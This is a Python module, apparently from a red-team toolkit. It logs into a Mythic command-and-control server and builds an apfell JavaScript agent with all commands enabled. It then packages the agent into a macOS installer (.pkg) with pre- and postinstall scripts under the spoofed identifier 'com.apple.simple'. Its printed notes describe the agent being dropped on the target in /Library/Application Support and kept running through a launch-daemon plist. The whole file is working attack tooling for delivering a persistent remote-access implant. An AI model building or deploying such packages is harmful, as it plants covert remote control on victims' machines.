import os
from .Utilities import *
import asyncio


def install_pkg_with_LD():
    temp = "./Templates/Installer_Package_with_LD"
    payload = "./Payloads/Installer_Package_with_LD_Payload"

    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        print("[+] Logging into Mythic")
        mythic_instance = await login_mythic()
        print("[+] Creating new apfell payload")
        # define what our payload should be
        resp = await create_apfell_payload(mythic_instance=mythic_instance,
                                           description="Installer Pkg with LD",
                                           filename="Install_LD.js",
                                           include_all_commands=True)
        if resp["build_phase"] == "success":
            payload_contents = await mythic.download_payload(mythic=mythic_instance, payload_uuid=resp["uuid"])
            pkg_payload = payload + "/simple-package/scripts/files/SimpleStarter.js"
            with open(pkg_payload, "wb") as f:
                f.write(payload_contents)

            #  Build the payload (currently no payload)
            print("[*] Building Installer Package with LD Payload")
            os.system("chmod +x ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts/preinstall")
            os.system("chmod +x ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts/postinstall")
            os.system(
                "pkgbuild --identifier com.apple.simple --nopayload --scripts ./Payloads/Installer_Package_with_LD_Payload/simple-package/scripts ./Payloads/Installer_Package_with_LD_Payload/simple_LD.pkg")

            # To add payload :
            # --root (optional): The path to the root directory for the installer payload.​
            print("[+] Built simple_LD.pkg")
            print("Notes: \n"
                  "1) This version saves the apfell payload on target as /Library/Application Support/SimpleStarter.js \n"
                  "2) Modify the com.simple.plist and SimpleStarter.js to change this behavior")
        else:
            print(f"[-] Failed to build payload: {resp['build_stderr']}\n{resp['build_message']}")

    async def main():
        await scripting()

    asyncio.run(main())
